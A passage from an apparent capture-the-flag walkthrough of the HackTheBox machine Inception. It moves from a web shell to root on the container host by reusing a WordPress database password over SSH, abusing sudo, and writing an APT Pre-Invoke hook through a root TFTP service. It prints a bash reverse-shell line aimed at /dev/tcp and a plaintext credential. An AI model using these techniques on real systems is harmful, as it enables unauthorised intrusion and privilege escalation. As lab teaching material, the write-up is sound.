eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2893 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2101 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:340825 (340.8 KB)  TX bytes:272629 (272.6 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:3014 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3014 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:172432 (172.4 KB)  TX bytes:172432 (172.4 KB)

```

There’s no `.dockerenv` file in `/`, but the different IP seems a solid indicator. The hostname, Inception, seems like a pretty good hint as well (I think this was the first HTB machine with a container).

#### Web

Looking at the web root, there’s the `index.html` for the page I found earlier, as well as `dompdf`, but there’s also a `wordpress_4.8.3` directory:

```

www-data@Inception:/var/www/html$ ls
LICENSE.txt  assets  images      latest.tar.gz          wordpress_4.8.3
README.txt   dompdf  index.html  webdav_test_inception

```

There’s no way I could have known to look at this path during initial enumeration. Visiting this path via Firefox shows it’s not properly set up:

![image-20220328091646159](https://0xdfimages.gitlab.io/img/image-20220328091646159.png)

The `wp-config.php` file does have a configuration for the DB:

```

<?php
...[snip]...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');                     

/** MySQL database username */                      
define('DB_USER', 'root');                          

/** MySQL database password */                      
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname */                               
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');                       

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');   
...[snip]...

```

While the config says that the DB is on localhost, MySQL is not listening:

```

www-data@Inception:/var/www/html/webdav_test_inception$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::3128                 :::*                    LISTEN 

```

### SSH

I noted above that I could connect to SSH over `proxychains` through the Squid. I’ll try the DB password with both root and cobb, and the latter works:

```

oxdf@hacky$ proxychains sshpass -p 'VwPddNh7xMZyDQoByQL4' ssh root@127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
Permission denied, please try again.
oxdf@hacky$ proxychains sshpass -p 'VwPddNh7xMZyDQoByQL4' ssh cobb@127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon Mar 28 00:47:00 2022 from 127.0.0.1
cobb@Inception:~$

```

I’ll grab `user.txt`:

```

cobb@Inception:~$ cat user.txt
4a8bc2d6************************

```

## Shell as root in Container

### Enumeration

`sudo -l` to see if cobb can run `sudo` does ask for a password, but that’s not an issue as I have it:

```

cobb@Inception:~$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL

```

cobb can run anything as root!

### sudo

`sudo -i` will return a root shell:

```

cobb@Inception:~$ sudo -i
root@Inception:~#

```

`sudo su` would work as well:

```

cobb@Inception:~$ sudo su -
root@Inception:~#

```

## Shell as root

### Enumeration

#### Network Enumeration

A quick `ping` sweep of the subnet shows only one other host, .1, which is likely the host for the container:

```

root@Inception:~# for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.123 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.044 ms

```

`nc` can help identify open ports:

```

root@Inception:~# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused | tee scan
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!

```

Both DNS (53) and FTP (21) are interesting, as neither was open in the original `nmap`.

#### Connect FTP

The server allows for anonymous login:

```

root@Inception:~# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

It looks to be in the root of the file system:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 30  2017 bin
drwxr-xr-x    3 0        0            4096 Nov 30  2017 boot
drwxr-xr-x   19 0        0            3920 Mar 27 21:22 dev
drwxr-xr-x   93 0        0            4096 Mar 27 23:41 etc
drwxr-xr-x    2 0        0            4096 Nov 06  2017 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
lrwxrwxrwx    1 0        0              32 Nov 06  2017 initrd.img.old -> boot/initrd.img-4.4.0-98-generic
drwxr-xr-x   22 0        0            4096 Nov 30  2017 lib
drwxr-xr-x    2 0        0            4096 Oct 30  2017 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 01  2017 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  373 0        0               0 Mar 27 21:22 proc
drwx------    6 0        0            4096 Nov 08  2017 root
drwxr-xr-x   26 0        0             960 Mar 28 06:25 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Apr 29  2017 snap
drwxr-xr-x    3 0        0            4096 Nov 06  2017 srv
dr-xr-xr-x   13 0        0               0 Mar 28 13:13 sys
drwxrwxrwt   10 0        0            4096 Mar 28 16:08 tmp
drwxr-xr-x   10 0        0            4096 Oct 30  2017 usr
drwxr-xr-x   13 0        0            4096 Oct 30  2017 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
lrwxrwxrwx    1 0        0              29 Nov 06  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
226 Directory send OK.

```

#### FTP Write Fail

My first thought is to try to use FTP to write something to a `cron`. I can download the `crontab` file:

```

ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (826 bytes).
226 Transfer complete.
826 bytes received in 0.00 secs (7.3620 MB/s)

```

From a different shell in the container, I can read it:

```

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null

```

It’s worth noting that `apt update` runs on the box every five minutes (and `apt upgrade` every day at 23:30).

I can’t write back:

```

ftp> put crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
550 Permission denied.

```

#### Identify TFTP

I’ll try to read things from `/proc/net` like `arp`, `tcp`, and `fib_trie` (like `arp`, `netstat`, and `ifconfig`), but all download 0 byte files. Checking `/etc/init.d` will give a list of services:

```

ftp> cd /etc/init.d
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2427 Jan 19  2016 README
-rwxr-xr-x    1 0        0            2243 Feb 09  2016 acpid
-rwxr-xr-x    1 0        0            6223 Mar 03  2017 apparmor
-rwxr-xr-x    1 0        0            2802 Nov 17  2017 apport
-rwxr-xr-x    1 0        0            1071 Dec 06  2015 atd
-rwxr-xr-x    1 0        0            1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x    1 0        0            3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x    1 0        0            1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x    1 0        0            9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x    1 0        0            1343 Apr 04  2016 console-setup
-rwxr-xr-x    1 0        0            3049 Apr 05  2016 cron
-rwxr-xr-x    1 0        0             937 Mar 28  2015 cryptdisks
-rwxr-xr-x    1 0        0             896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x    1 0        0            2813 Dec 02  2015 dbus
-rwxr-xr-x    1 0        0            1105 Mar 15  2016 grub-common
-rwxr-xr-x    1 0        0            1336 Jan 19  2016 halt
-rwxr-xr-x    1 0        0            1423 Jan 19  2016 hostname.sh
-rwxr-xr-x    1 0        0            3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x    1 0        0            2372 Apr 11  2016 irqbalance
-rwxr-xr-x    1 0        0            1503 Mar 29  2016 iscsid
-rwxr-xr-x    1 0        0            1804 Apr 04  2016 keyboard-setup
-rwxr-xr-x    1 0        0            1300 Jan 19  2016 killprocs
-rwxr-xr-x    1 0        0            2087 Dec 20  2015 kmod
-rwxr-xr-x    1 0        0             695 Oct 30  2015 lvm2
-rwxr-xr-x    1 0        0             571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x    1 0        0             586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x    1 0        0            2378 Nov 09  2017 lxcfs
-rwxr-xr-x    1 0        0            2541 Jun 08  2017 lxd
-rwxr-xr-x    1 0        0            2365 Oct 09  2017 mdadm
-rwxr-xr-x    1 0        0            1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x    1 0        0             703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x    1 0        0            2301 Jan 19  2016 mountall.sh
-rwxr-xr-x    1 0        0            1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x    1 0        0            1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x    1 0        0             711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x    1 0        0            2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x    1 0        0            4771 Jul 19  2015 networking
-rwxr-xr-x    1 0        0            1581 Oct 16  2015 ondemand
-rwxr-xr-x    1 0        0            2503 Mar 29  2016 open-iscsi
-rwxr-xr-x    1 0        0            1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x    1 0        0            1366 Nov 15  2015 plymouth
-rwxr-xr-x    1 0        0             752 Nov 15  2015 plymouth-log
-rwxr-xr-x    1 0        0            1192 Sep 06  2015 procps
-rwxr-xr-x    1 0        0            6366 Jan 19  2016 rc
-rwxr-xr-x    1 0        0             820 Jan 19  2016 rc.local
-rwxr-xr-x    1 0        0             117 Jan 19  2016 rcS
-rwxr-xr-x    1 0        0             661 Jan 19  2016 reboot
-rwxr-xr-x    1 0        0            4149 Nov 23  2015 resolvconf
-rwxr-xr-x    1 0        0            4355 Jul 10  2014 rsync
-rwxr-xr-x    1 0        0            2796 Feb 03  2016 rsyslog
-rwxr-xr-x    1 0        0            1226 Jun 09  2015 screen-cleanup
-rwxr-xr-x    1 0        0            3927 Jan 19  2016 sendsigs
-rwxr-xr-x    1 0        0             597 Jan 19  2016 single
-rw-r--r--    1 0        0            1087 Jan 19  2016 skeleton
-rwxr-xr-x    1 0        0            4077 Mar 16  2017 ssh
-rwxr-xr-x    1 0        0            2070 Mar 24  2017 tftpd-hpa
-rwxr-xr-x    1 0        0            6087 Apr 12  2016 udev
-rwxr-xr-x    1 0        0            2049 Aug 07  2014 ufw
-rwxr-xr-x    1 0        0            2737 Jan 19  2016 umountfs
-rwxr-xr-x    1 0        0            2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x    1 0        0            1879 Jan 19  2016 umountroot
-rwxr-xr-x    1 0        0            1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x    1 0        0            3111 Jan 19  2016 urandom
-rwxr-xr-x    1 0        0            1306 Jun 14  2017 uuidd
-rwxr-xr-x    1 0        0            2031 Feb 10  2016 vsftpd
-rwxr-xr-x    1 0        0            2757 Nov 10  2015 x11-common
-rwxr-xr-x    1 0        0            2443 Oct 26  2013 xinetd
226 Directory send OK.

```

`lxd` is likely what’s handling the container. `tftpd-hpa` is interesting. I didn’t scan for UDP ports (which isn’t the most reliable thing anyway). I’ll try, and TFTP is open:

```

cobb@Inception:~$ nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 53 port [udp/domain] succeeded!
Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
Connection to 192.168.0.1 69 port [udp/tftp] succeeded!

```

#### TFTP

There’s a `tftpd-hpa` config file in `/etc/default`, which I’ll grab back to the container and read:

```

TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"

```

This indicates that the service is running, mounted on the filesystem root, and running as root.

I’ll connect to this from the container as well:

```

cobb@Inception:~$ tftp 192.168.0.1
tftp> ls

```

TFTP doesn’t have any kind of ability to list files, so I’ll have to use FTP for that. But this session does have write access. For example, I’ll create `test.txt` and upload it:

```

cobb@Inception:~$ touch test.txt
cobb@Inception:~$ tftp 192.168.0.1
tftp> put test.txt /tmp/text.txt

```

Via FTP I can see it’s there:

```

ftp> ls /tmp
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwt    2 0        0            4096 Mar 27 21:22 VMwareDnD
drwx------    3 0        0            4096 Mar 27 21:22 systemd-private-8ffa82883b334b0f83014ced1396dea6-systemd-timesyncd.service-sBVjdw
-rw-rw-rw-    1 0        0               0 Mar 28 18:29 text.txt
drwx------    2 0        0            4096 Mar 27 21:22 vmware-root
226 Directory send OK.

```

I can’t overwrite files as root:

```

tftp> put test.txt /etc/crontab
Error code 2: File must have global write permissions

```

Any file I do upload will have 666 permissions. This rules out writing `/root/.ssh/authorized_keys`, because while I can write the file, I can’t change the permissions to 600, so `sshd` will ignore it.

### Apt Pre-Invoke Script

I know that `apt update` is running every 5 minutes. I’ll add a file to create a [Pre-Invoke](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/) script, which will run each time `apt` runs.

I’ll create a simple config on the container:

```

APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/192.168.0.10/4433 0>&1'"}

```

Because I don’t know if the host can connect back to my host (I’ve had issues with outbound firewall already on Inception), I’ll have it connect to the container.

I’ll upload that file with TFTP:

```

tftp> put /dev/shm/00evil /etc/apt/apt.conf.d/00evil
Sent 82 bytes in 0.0 seconds

```

I’ll start `nc` listening on the container and wait. When the cron runs, I get a shell:

```

cobb@Inception:/$ nc -lnvp 4433
Listening on [0.0.0.0] (family 0, port 4433)
Connection from [192.168.0.1] port 4433 [tcp/*] accepted (family 2, sport 56646)
bash: cannot set terminal process group (24044): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp# 

```

It’s a bit confusing because both host and container have the hostname Inception.

Regardless, I can get the final flag:

```

root@Inception:~# cat root.txt
8d1e2e91************************

```